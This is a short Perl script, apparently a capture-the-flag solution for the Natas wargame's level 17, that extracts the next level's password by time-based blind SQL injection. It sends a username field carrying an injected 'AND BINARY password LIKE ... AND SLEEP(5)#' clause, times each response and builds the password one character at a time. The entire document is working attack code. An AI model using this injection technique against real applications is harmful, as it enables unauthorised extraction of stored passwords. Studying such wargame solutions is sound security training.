sub responsetime {
    my ($username) = @_;

    my $start_time = time();
    my $response = req $username; # same req function used in level14-15
    my $end_time = time();

    return $end_time - $start_time;
}

my $sleep = 5;

while (length $natas18_pass < 32) {
    for my $ch (split //, $chars) {
       my $candidate = "$natas18_pass$ch";
       print "Attempting password: $candidate\n";
       my $query = "natas18\"AND BINARY password LIKE \"$candidate%\"AND SLEEP($sleep)#";

       if (responsetime($query) > 3) {
           $natas18_pass = $candidate;
           print "$natas18_pass\n";
           last;
       }
   }
}
